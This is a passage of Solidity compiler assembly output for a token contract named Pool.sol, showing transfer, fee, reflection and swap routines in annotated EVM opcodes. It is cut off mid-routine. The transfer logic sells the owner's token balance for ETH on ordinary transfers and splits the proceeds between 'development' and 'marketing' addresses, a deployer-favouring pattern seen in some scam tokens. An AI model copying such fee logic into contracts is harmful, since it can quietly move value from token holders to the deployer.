  tag_103\n        /* \"contracts/Pool/Pool.sol\":9255:9262  owner() */\n      jump\t// in\n    tag_296:\n        /* \"contracts/Pool/Pool.sol\":9249:9262  to != owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9249:9251  to */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":9249:9262  to != owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":9230:9262  from != owner() && to != owner() */\n    tag_295:\n        /* \"contracts/Pool/Pool.sol\":9226:10278  if (from != owner() && to != owner()) {... */\n      iszero\n      tag_297\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":9278:9303  uint256 ownerTokenBalance */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":9306:9333  balanceOf(address(owner())) */\n      tag_298\n        /* \"contracts/Pool/Pool.sol\":9324:9331  owner() */\n      tag_299\n        /* \"contracts/Pool/Pool.sol\":9324:9329  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":9324:9331  owner() */\n      jump\t// in\n    tag_299:\n        /* \"contracts/Pool/Pool.sol\":9306:9315  balanceOf */\n      tag_91\n        /* \"contracts/Pool/Pool.sol\":9306:9333  balanceOf(address(owner())) */\n      jump\t// in\n    tag_298:\n        /* \"contracts/Pool/Pool.sol\":9278:9333  uint256 ownerTokenBalance = balanceOf(address(owner())) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":9352:9358  inSwap */\n      0x14\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Pool/Pool.sol\":9351:9358  !inSwap */\n      iszero\n        /* \"contracts/Pool/Pool.sol\":9351:9383  !inSwap && from != uniswapV2Pair */\n      dup1\n      iszero\n      tag_300\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":9370:9383  uniswapV2Pair */\n      0x14\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9362:9383  from != uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9362:9366  from */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":9362:9383  from != uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":9351:9383  !inSwap && from != uniswapV2Pair */\n    tag_300:\n        /* \"contracts/Pool/Pool.sol\":9351:9398  !inSwap && from != uniswapV2Pair && swapEnabled */\n      dup1\n      iszero\n      tag_301\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":9387:9398  swapEnabled */\n      0x14\n      0x15\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Pool/Pool.sol\":9351:9398  !inSwap && from != uniswapV2Pair && swapEnabled */\n    tag_301:\n        /* \"contracts/Pool/Pool.sol\":9351:9423  !inSwap && from != uniswapV2Pair && swapEnabled && ownerTokenBalance > 0 */\n      dup1\n      iszero\n      tag_302\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":9422:9423  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":9402:9419  ownerTokenBalance */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":9402:9423  ownerTokenBalance > 0 */\n      gt\n        /* \"contracts/Pool/Pool.sol\":9351:9423  !inSwap && from != uniswapV2Pair && swapEnabled && ownerTokenBalance > 0 */\n    tag_302:\n        /* \"contracts/Pool/Pool.sol\":9347:9681  if (!inSwap && from != uniswapV2Pair && swapEnabled && ownerTokenBalance > 0) {... */\n      iszero\n      tag_303\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":9443:9478  swapTokensForEth(ownerTokenBalance) */\n      tag_304\n        /* \"contracts/Pool/Pool.sol\":9460:9477  ownerTokenBalance */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":9443:9459  swapTokensForEth */\n      tag_257\n        /* \"contracts/Pool/Pool.sol\":9443:9478  swapTokensForEth(ownerTokenBalance) */\n      jump\t// in\n    tag_304:\n        /* \"contracts/Pool/Pool.sol\":9496:9522  uint256 contractETHBalance */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":9525:9546  address(this).balance */\n      selfbalance\n        /* \"contracts/Pool/Pool.sol\":9496:9546  uint256 contractETHBalance = address(this).balance */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":9588:9589  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":9567:9585  contractETHBalance */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":9567:9589  contractETHBalance > 0 */\n      gt\n        /* \"contracts/Pool/Pool.sol\":9564:9667  if(contractETHBalance > 0) {... */\n      iszero\n      tag_305\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":9613:9648  sendETHToFee(address(this).balance) */\n      tag_306\n        /* \"contracts/Pool/Pool.sol\":9626:9647  address(this).balance */\n      selfbalance\n        /* \"contracts/Pool/Pool.sol\":9613:9625  sendETHToFee */\n      tag_198\n        /* \"contracts/Pool/Pool.sol\":9613:9648  sendETHToFee(address(this).balance) */\n      jump\t// in\n    tag_306:\n        /* \"contracts/Pool/Pool.sol\":9564:9667  if(contractETHBalance > 0) {... */\n    tag_305:\n        /* \"contracts/Pool/Pool.sol\":9425:9681  {... */\n      pop\n        /* \"contracts/Pool/Pool.sol\":9347:9681  if (!inSwap && from != uniswapV2Pair && swapEnabled && ownerTokenBalance > 0) {... */\n    tag_303:\n        /* \"contracts/Pool/Pool.sol\":9718:9731  uniswapV2Pair */\n      0x14\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9710:9731  from == uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9710:9714  from */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":9710:9731  from == uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":9710:9765  from == uniswapV2Pair && to != address(uniswapV2Router) */\n      dup1\n      iszero\n      tag_307\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":9749:9764  uniswapV2Router */\n      0x11\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9735:9765  to != address(uniswapV2Router) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9735:9737  to */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":9735:9765  to != address(uniswapV2Router) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":9710:9765  from == uniswapV2Pair && to != address(uniswapV2Router) */\n    tag_307:\n        /* \"contracts/Pool/Pool.sol\":9707:9866  if(from == uniswapV2Pair && to != address(uniswapV2Router)) {... */\n      iszero\n      tag_308\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":9797:9811  _redisFeeOnBuy */\n      sload(0x08)\n        /* \"contracts/Pool/Pool.sol\":9785:9794  _redisFee */\n      0x0c\n        /* \"contracts/Pool/Pool.sol\":9785:9811  _redisFee = _redisFeeOnBuy */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":9839:9851  _taxFeeOnBuy */\n      sload(0x09)\n        /* \"contracts/Pool/Pool.sol\":9829:9836  _taxFee */\n      0x0d\n        /* \"contracts/Pool/Pool.sol\":9829:9851  _taxFee = _taxFeeOnBuy */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":9707:9866  if(from == uniswapV2Pair && to != address(uniswapV2Router)) {... */\n    tag_308:\n        /* \"contracts/Pool/Pool.sol\":9894:9907  uniswapV2Pair */\n      0x14\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9888:9907  to == uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9888:9890  to */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":9888:9907  to == uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":9888:9943  to == uniswapV2Pair && from != address(uniswapV2Router) */\n      dup1\n      iszero\n      tag_309\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":9927:9942  uniswapV2Router */\n      0x11\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9911:9943  from != address(uniswapV2Router) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9911:9915  from */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":9911:9943  from != address(uniswapV2Router) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":9888:9943  to == uniswapV2Pair && from != address(uniswapV2Router) */\n    tag_309:\n        /* \"contracts/Pool/Pool.sol\":9884:10046  if (to == uniswapV2Pair && from != address(uniswapV2Router)) {... */\n      iszero\n      tag_310\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":9975:9990  _redisFeeOnSell */\n      sload(0x0a)\n        /* \"contracts/Pool/Pool.sol\":9963:9972  _redisFee */\n      0x0c\n        /* \"contracts/Pool/Pool.sol\":9963:9990  _redisFee = _redisFeeOnSell */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":10018:10031  _taxFeeOnSell */\n      sload(0x0b)\n        /* \"contracts/Pool/Pool.sol\":10008:10015  _taxFee */\n      0x0d\n        /* \"contracts/Pool/Pool.sol\":10008:10031  _taxFee = _taxFeeOnSell */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":9884:10046  if (to == uniswapV2Pair && from != address(uniswapV2Router)) {... */\n    tag_310:\n        /* \"contracts/Pool/Pool.sol\":10077:10095  _isExcludedFromFee */\n      0x05\n        /* \"contracts/Pool/Pool.sol\":10077:10101  _isExcludedFromFee[from] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10096:10100  from */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":10077:10101  _isExcludedFromFee[from] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Pool/Pool.sol\":10077:10127  _isExcludedFromFee[from] || _isExcludedFromFee[to] */\n      dup1\n      tag_311\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":10105:10123  _isExcludedFromFee */\n      0x05\n        /* \"contracts/Pool/Pool.sol\":10105:10127  _isExcludedFromFee[to] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10124:10126  to */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":10105:10127  _isExcludedFromFee[to] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Pool/Pool.sol\":10077:10127  _isExcludedFromFee[from] || _isExcludedFromFee[to] */\n    tag_311:\n        /* \"contracts/Pool/Pool.sol\":10076:10178  (_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair) */\n      dup1\n      tag_312\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":10141:10154  uniswapV2Pair */\n      0x14\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10133:10154  from != uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10133:10137  from */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":10133:10154  from != uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":10133:10177  from != uniswapV2Pair && to != uniswapV2Pair */\n      dup1\n      iszero\n      tag_313\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":10164:10177  uniswapV2Pair */\n      0x14\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10158:10177  to != uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10158:10160  to */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":10158:10177  to != uniswapV2Pair */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":10133:10177  from != uniswapV2Pair && to != uniswapV2Pair */\n    tag_313:\n        /* \"contracts/Pool/Pool.sol\":10076:10178  (_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair) */\n    tag_312:\n        /* \"contracts/Pool/Pool.sol\":10072:10255  if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {... */\n      iszero\n      tag_314\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":10210:10211  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10198:10207  _redisFee */\n      0x0c\n        /* \"contracts/Pool/Pool.sol\":10198:10211  _redisFee = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":10239:10240  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10229:10236  _taxFee */\n      0x0d\n        /* \"contracts/Pool/Pool.sol\":10229:10240  _taxFee = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":10072:10255  if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {... */\n    tag_314:\n        /* \"contracts/Pool/Pool.sol\":9264:10278  {... */\n      pop\n        /* \"contracts/Pool/Pool.sol\":9226:10278  if (from != owner() && to != owner()) {... */\n    tag_297:\n        /* \"contracts/Pool/Pool.sol\":10288:10318  _tokenTransfer(from,to,amount) */\n      tag_315\n        /* \"contracts/Pool/Pool.sol\":10303:10307  from */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":10308:10310  to */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":10311:10317  amount */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":10288:10302  _tokenTransfer */\n      tag_179\n        /* \"contracts/Pool/Pool.sol\":10288:10318  _tokenTransfer(from,to,amount) */\n      jump\t// in\n    tag_315:\n        /* \"contracts/Pool/Pool.sol\":8912:10325  function _transfer(address from, address to, uint256 amount) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":2105:2291  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_159:\n        /* \"contracts/Pool/Pool.sol\":2191:2198  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2223:2224  a */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2218:2219  b */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2218:2224  b <= a */\n      gt\n      iszero\n        /* \"contracts/Pool/Pool.sol\":2226:2238  errorMessage */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":2210:2239  require(b <= a, errorMessage) */\n      swap1\n      tag_317\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_318\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_318:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_317:\n      pop\n        /* \"contracts/Pool/Pool.sol\":2249:2258  uint256 c */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":2265:2266  b */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":2261:2262  a */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":2261:2266  a - b */\n      tag_319\n      swap2\n      swap1\n      tag_320\n      jump\t// in\n    tag_319:\n        /* \"contracts/Pool/Pool.sol\":2249:2266  uint256 c = a - b */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":2283:2284  c */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":2276:2284  return c */\n      swap2\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":2105:2291  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":10988:11132  function _tokenTransfer(address sender, address recipient, uint256 amount) private {... */\n    tag_179:\n        /* \"contracts/Pool/Pool.sol\":11081:11125  _transferStandard(sender, recipient, amount) */\n      tag_322\n        /* \"contracts/Pool/Pool.sol\":11099:11105  sender */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":11107:11116  recipient */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":11118:11124  amount */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":11081:11098  _transferStandard */\n      tag_323\n        /* \"contracts/Pool/Pool.sol\":11081:11125  _transferStandard(sender, recipient, amount) */\n      jump\t// in\n    tag_322:\n        /* \"contracts/Pool/Pool.sol\":10988:11132  function _tokenTransfer(address sender, address recipient, uint256 amount) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":10821:10978  function sendETHToFee(uint256 amount) private {... */\n    tag_198:\n        /* \"contracts/Pool/Pool.sol\":10877:10896  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10877:10905  _developmentAddress.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10877:10920  _developmentAddress.transfer(amount.div(2)) */\n      0x08fc\n        /* \"contracts/Pool/Pool.sol\":10906:10919  amount.div(2) */\n      tag_325\n        /* \"contracts/Pool/Pool.sol\":10917:10918  2 */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":10906:10912  amount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":10906:10916  amount.div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":10906:10919  amount.div(2) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_325:\n        /* \"contracts/Pool/Pool.sol\":10877:10920  _developmentAddress.transfer(amount.div(2)) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_328\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_328:\n      pop\n        /* \"contracts/Pool/Pool.sol\":10930:10947  _marketingAddress */\n      0x0f\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10930:10956  _marketingAddress.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10930:10971  _marketingAddress.transfer(amount.div(2)) */\n      0x08fc\n        /* \"contracts/Pool/Pool.sol\":10957:10970  amount.div(2) */\n      tag_329\n        /* \"contracts/Pool/Pool.sol\":10968:10969  2 */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":10957:10963  amount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":10957:10967  amount.div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":10957:10970  amount.div(2) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_329:\n        /* \"contracts/Pool/Pool.sol\":10930:10971  _marketingAddress.transfer(amount.div(2)) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_331\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_331:\n      pop\n        /* \"contracts/Pool/Pool.sol\":10821:10978  function sendETHToFee(uint256 amount) private {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":7386:7636  function tokenFromReflection(uint256 rAmount) private view returns(uint256) {... */\n    tag_201:\n        /* \"contracts/Pool/Pool.sol\":7453:7460  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7491:7498  _rTotal */\n      sload(0x06)\n        /* \"contracts/Pool/Pool.sol\":7480:7487  rAmount */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":7480:7498  rAmount <= _rTotal */\n      gt\n      iszero\n        /* \"contracts/Pool/Pool.sol\":7472:7545  require(rAmount <= _rTotal, \"Amount must be less than total reflections\") */\n      tag_333\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_334\n      swap1\n      tag_335\n      jump\t// in\n    tag_334:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_333:\n        /* \"contracts/Pool/Pool.sol\":7555:7574  uint256 currentRate */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7578:7588  _getRate() */\n      tag_336\n        /* \"contracts/Pool/Pool.sol\":7578:7586  _getRate */\n      tag_337\n        /* \"contracts/Pool/Pool.sol\":7578:7588  _getRate() */\n      jump\t// in\n    tag_336:\n        /* \"contracts/Pool/Pool.sol\":7555:7588  uint256 currentRate =  _getRate() */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":7605:7629  rAmount.div(currentRate) */\n      tag_338\n        /* \"contracts/Pool/Pool.sol\":7617:7628  currentRate */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":7605:7612  rAmount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7605:7616  rAmount.div */\n      tag_326\n      swap1\n        /* \"contracts/Pool/Pool.sol\":7605:7629  rAmount.div(currentRate) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_338:\n        /* \"contracts/Pool/Pool.sol\":7598:7629  return rAmount.div(currentRate) */\n      swap2\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":7386:7636  function tokenFromReflection(uint256 rAmount) private view returns(uint256) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":10333:10807  function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {... */\n    tag_257:\n        /* \"contracts/Pool/Pool.sol\":5242:5246  true */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":5233:5239  inSwap */\n      0x14\n      dup1\n        /* \"contracts/Pool/Pool.sol\":5233:5246  inSwap = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":10410:10431  address[] memory path */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10448:10449  2 */\n      0x02\n        /* \"contracts/Pool/Pool.sol\":10434:10450  new address[](2) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_341\n      jumpi\n      tag_342\n      tag_343\n      jump\t// in\n    tag_342:\n    tag_341:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_344\n      jumpi\n      dup2\n      0x20\n      add\n      0x20\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_344:\n      pop\n        /* \"contracts/Pool/Pool.sol\":10410:10450  address[] memory path = new address[](2) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":10478:10482  this */\n      address\n        /* \"contracts/Pool/Pool.sol\":10460:10464  path */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":10465:10466  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":10460:10467  path[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_345\n      jumpi\n      tag_346\n      tag_268\n      jump\t// in\n    tag_346:\n    tag_345:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"contracts/Pool/Pool.sol\":10460:10483  path[0] = address(this) */\n      swap1\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":10503:10518  uniswapV2Router */\n      0x11\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10503:10523  uniswapV2Router.WETH */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xad5c4648\n        /* \"contracts/Pool/Pool.sol\":10503:10525  uniswapV2Router.WETH() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_348\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_348:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_349\n      swap2\n      swap1\n      tag_350\n      jump\t// in\n    tag_349:\n        /* \"contracts/Pool/Pool.sol\":10493:10497  path */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":10498:10499  1 */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":10493:10500  path[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_351\n      jumpi\n      tag_352\n      tag_268\n      jump\t// in\n    tag_352:\n    tag_351:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"contracts/Pool/Pool.sol\":10493:10525  path[1] = uniswapV2Router.WETH() */\n      swap1\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":10535:10600  _approve(address(owner()), address(uniswapV2Router), tokenAmount) */\n      tag_353\n        /* \"contracts/Pool/Pool.sol\":10552:10559  owner() */\n      tag_354\n        /* \"contracts/Pool/Pool.sol\":10552:10557  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":10552:10559  owner() */\n      jump\t// in\n    tag_354:\n        /* \"contracts/Pool/Pool.sol\":10570:10585  uniswapV2Router */\n      0x11\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10588:10599  tokenAmount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":10535:10543  _approve */\n      tag_150\n        /* \"contracts/Pool/Pool.sol\":10535:10600  _approve(address(owner()), address(uniswapV2Router), tokenAmount) */\n      jump\t// in\n    tag_353:\n        /* \"contracts/Pool/Pool.sol\":10610:10625  uniswapV2Router */\n      0x11\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":10610:10676  uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x791ac947\n        /* 